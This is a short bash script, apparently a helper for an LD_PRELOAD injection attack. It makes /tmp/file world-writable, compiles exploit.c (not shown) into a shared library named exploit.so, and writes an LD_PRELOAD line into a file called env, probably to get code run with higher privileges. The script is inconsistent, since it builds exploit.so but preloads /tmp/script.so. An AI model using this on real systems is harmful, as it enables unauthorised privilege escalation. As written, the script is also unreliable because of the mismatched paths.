#!/bin/bash

touch /tmp/file
chmod 777 /tmp/file

gcc -fPIC -g -c exploit.c
gcc -shared -o exploit.so exploit.o -lc

echo "LD_PRELOAD=/tmp/script.so" > env
